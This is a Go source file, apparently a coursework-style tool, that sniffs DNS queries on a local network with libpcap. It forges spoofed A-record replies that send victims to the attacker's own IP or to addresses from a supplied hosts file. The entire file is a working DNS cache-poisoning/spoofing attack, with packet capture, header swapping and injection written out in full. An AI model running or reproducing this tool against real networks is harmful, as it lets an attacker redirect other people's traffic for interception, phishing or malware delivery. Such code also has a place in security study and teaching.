package main

import (
	//"encoding/hex"
	"fmt"
	"io/ioutil"
	"net"
	"os"

	// "strconv"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func poison(interfaces string, string1 string, bpfstr string, m map[string]string) {
	if ifaceHandle, err := pcap.OpenLive(interfaces, 1600, true, pcap.BlockForever); err != nil {
		panic(err)
	} else {
		if len(bpfstr) == 0 {
			ifaceHandle.SetBPFFilter("udp and dst port 53")
		}
		if len(bpfstr) != 0 {
			ifaceHandle.SetBPFFilter(bpfstr)
		}

		ifaces, err := net.Interfaces()
		if err != nil {
			panic(err)
		}
		var ip net.IP
		for i := range ifaces {

			if ifaces[i].Name != interfaces {
				continue
			}

			addrs, err := ifaces[i].Addrs()
			if err != nil {
				panic(err)
			}

			if len(addrs) < 1 {
				panic("No address on target interface")
			}

			ip, _, err = net.ParseCIDR(addrs[0].String())
			if err != nil {
				panic(err)
			}

			break

		}
		var ethLayer layers.Ethernet
		var ipv4Layer layers.IPv4
		var udpLayer layers.UDP
		var dnsLayer layers.DNS

		var question layers.DNSQuestion
		var answer layers.DNSResourceRecord

		decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)

		decodedLayers := make([]gopacket.LayerType, 0, 4)

		//var ip net.IP = "192.168.2.128"
		//ip, _, _ := net.ParseCIDR("192.168.2.128")
		answer.Type = layers.DNSTypeA
		answer.Class = layers.DNSClassIN
		answer.TTL = 300
		//a.IP = net.ParseIP(v)
		_ = ip
		//a.IP = net.IP{192, 168, 2, 128}

		outbuf := gopacket.NewSerializeBuffer()

		serialOpts := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}

		var i uint16

		var ipv4Addr net.IP
		var udpPort layers.UDPPort
		var ethMac net.HardwareAddr

		for {
			packetData, _, err := ifaceHandle.ZeroCopyReadPacketData()

			if err != nil {
				break
			}

			fmt.Println("Packet captured. Checking Request...")

			err = decoder.DecodeLayers(packetData, &decodedLayers)
			if err != nil {
				fmt.Println("Decoding error!")
				continue
			}

			if len(decodedLayers) != 4 {
				fmt.Println("Not enough layers!")
				continue
			}

			if dnsLayer.QR {
				continue
			}

			for i = 0; i < dnsLayer.QDCount; i++ {
				fmt.Println("Request : ", string(dnsLayer.Questions[i].Name))
			}

			dnsLayer.QR = true

			if dnsLayer.RD {
				dnsLayer.RA = true
			}
			var found bool
			var v string
			for i = 0; i < dnsLayer.QDCount; i++ {

				question = dnsLayer.Questions[i]

				if question.Type != layers.DNSTypeA || question.Class != layers.DNSClassIN {
					continue
				}
				v, found = m[string(question.Name)]

				answer.IP = net.ParseIP(v)
				//fmt.Println("v is", v)

				//fmt.Println("qname is ", string(question.Name))
				answer.Name = question.Name

				dnsLayer.Answers = append(dnsLayer.Answers, answer)
				dnsLayer.ANCount = dnsLayer.ANCount + 1

			}

			ethMac = ethLayer.SrcMAC
			ethLayer.SrcMAC = ethLayer.DstMAC
			ethLayer.DstMAC = ethMac

			ipv4Addr = ipv4Layer.SrcIP
			ipv4Layer.SrcIP = ipv4Layer.DstIP
			ipv4Layer.DstIP = ipv4Addr

			udpPort = udpLayer.SrcPort
			udpLayer.SrcPort = udpLayer.DstPort
			udpLayer.DstPort = udpPort

			err = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
			if err != nil {
				panic(err)
			}

			err = gopacket.SerializeLayers(outbuf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
			if err != nil {
				panic(err)
			}

			if found {
				err = ifaceHandle.WritePacketData(outbuf.Bytes())
				if err != nil {
					panic(err)
				}
				fmt.Println("Response sent")
			}

			continue

		}
	}
}

func getIFaceIP(ifacename string) net.IP {

	// get the list of interfaces
	ifaces, err := net.Interfaces()
	if err != nil {
		panic(err)
	}

	// loop through them to get our local address
	for i := range ifaces {

		// check it's the interface we want
		if ifaces[i].Name != ifacename {
			continue
		}

		// get the addresses
		addrs, err := ifaces[i].Addrs()
		if err != nil {
			panic(err)
		}

		// check to ensure there is an address on this interface
		if len(addrs) < 1 {
			panic("No address on target interface")
		}

		// use the first available address
		ip, _, err := net.ParseCIDR(addrs[0].String())
		if err != nil {
			panic(err)
		}

		return ip

	}
	return nil
}

func poison1(interfaces string, string1 string, bpfstr string, ip net.IP) {
	if ifaceHandle, err := pcap.OpenLive(interfaces, 1600, true, pcap.BlockForever); err != nil {
		panic(err)
	} else {
		if len(bpfstr) == 0 {
			ifaceHandle.SetBPFFilter("udp and dst port 53")
		}
		if len(bpfstr) != 0 {
			ifaceHandle.SetBPFFilter(bpfstr)
		}

		//var ip net.IP

		var ethLayer layers.Ethernet
		var ipv4Layer layers.IPv4
		var udpLayer layers.UDP
		var dnsLayer layers.DNS

		var question layers.DNSQuestion
		var answer layers.DNSResourceRecord

		decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)

		decodedLayers := make([]gopacket.LayerType, 0, 4)

		//var ip net.IP = "192.168.2.128"
		//ip, _, _ := net.ParseCIDR("192.168.2.128")
		answer.Type = layers.DNSTypeA
		answer.Class = layers.DNSClassIN
		answer.TTL = 300
		//a.IP = net.ParseIP(v)
		answer.IP = ip
		//a.IP = net.IP{192, 168, 2, 128}

		outbuf := gopacket.NewSerializeBuffer()

		serialOpts := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}

		var i uint16

		var ipv4Addr net.IP
		var udpPort layers.UDPPort
		var ethMac net.HardwareAddr

		for {
			packetData, _, err := ifaceHandle.ZeroCopyReadPacketData()

			if err != nil {
				break
			}

			fmt.Println("Packet captured. Checking Request...")

			err = decoder.DecodeLayers(packetData, &decodedLayers)
			if err != nil {
				fmt.Println("Decoding error!")
				continue
			}

			if len(decodedLayers) != 4 {
				fmt.Println("Not enough layers!")
				continue
			}

			if dnsLayer.QR {
				continue
			}

			for i = 0; i < dnsLayer.QDCount; i++ {
				fmt.Println("Request : ", string(dnsLayer.Questions[i].Name))
			}

			dnsLayer.QR = true

			if dnsLayer.RD {
				dnsLayer.RA = true
			}
			//var found bool
			//var v string
			for i = 0; i < dnsLayer.QDCount; i++ {

				question = dnsLayer.Questions[i]

				if question.Type != layers.DNSTypeA || question.Class != layers.DNSClassIN {
					continue
				}
				//v, found = m[string(question.Name)]

				//answer.IP = net.ParseIP(v)
				//fmt.Println("v is", v)

				//fmt.Println("qname is ", string(question.Name))
				answer.Name = question.Name

				dnsLayer.Answers = append(dnsLayer.Answers, answer)
				dnsLayer.ANCount = dnsLayer.ANCount + 1

			}

			ethMac = ethLayer.SrcMAC
			ethLayer.SrcMAC = ethLayer.DstMAC
			ethLayer.DstMAC = ethMac

			ipv4Addr = ipv4Layer.SrcIP
			ipv4Layer.SrcIP = ipv4Layer.DstIP
			ipv4Layer.DstIP = ipv4Addr

			udpPort = udpLayer.SrcPort
			udpLayer.SrcPort = udpLayer.DstPort
			udpLayer.DstPort = udpPort

			err = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
			if err != nil {
				panic(err)
			}

			err = gopacket.SerializeLayers(outbuf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
			if err != nil {
				panic(err)
			}

			err = ifaceHandle.WritePacketData(outbuf.Bytes())
			if err != nil {
				panic(err)
			}
			fmt.Println("Response sent")

			continue

		}
	}
}

func main() {
	devices, _ := pcap.FindAllDevs()

	var interfaces string = devices[0].Name
	var bpfstr string = ""
	var pcapname string
	var string1 string
	args1 := os.Args[1:]
	var ic = 0
	var sc = 0
	//var rc = 0
	var bc = 0

	for i := 0; i < len(args1); i = i + 2 {
		if args1[i] == "-i" {
			if ic == 1 {
				fmt.Println("2 times -i not accepted")
				os.Exit(1)
			}
			ic = 1
			interfaces = args1[i+1]
			if interfaces == "-r" || interfaces == "-f" || interfaces == "-i" {
				fmt.Println("incorrect expression. enter value after -i")
				os.Exit(1)
			}
		} else if args1[i] == "-f" {
			if sc == 1 {
				fmt.Println("2 times -f not accepted")
				os.Exit(1)
			}
			sc = 1
			string1 = args1[i+1]
			if string1 == "-r" || string1 == "-f" || string1 == "-i" {
				fmt.Println("incorrect expression. enter value after -i")
				os.Exit(1)
			}
		} else {
			if bc == 1 {
				fmt.Println("2 times bpf not accepted")
				os.Exit(1)
			}
			bc = 1
			bpfstr = args1[i]
			i = i - 1
		}
	}

	_ = interfaces
	_ = string1
	_ = pcapname
	if len(pcapname) != 0 && len(interfaces) != 0 {
		fmt.Println("only -r will work")
		interfaces = ""
	}

	if len(string1) == 0 {

		ip := getIFaceIP(interfaces)
		fmt.Println("interface= ", interfaces)

		fmt.Println("bpfstr= ", bpfstr)
		fmt.Println("Poisoning all requests")
		poison1(interfaces, string1, bpfstr, ip)
		return
	}

	data, err := ioutil.ReadFile(string1)
	if err != nil {
		//fmt.Println("file reading error", err)
		return
	}
	filecontent := string(data)
	line := strings.Split(filecontent, "\n")
	var m = make(map[string]string)
	for i, e := range line {
		_ = i
		x := strings.Fields(e)
		if len(x) == 0 {
			break
		}
		m[x[1]] = x[0]
	}

	fmt.Println("interface= ", interfaces)
	fmt.Println("hostfile= ", string1)
	//fmt.Println("pcapname= ", pcapname)
	fmt.Println("bpfstr= ", bpfstr)
	fmt.Println("map:", m)

	poison(interfaces, string1, bpfstr, m)

}
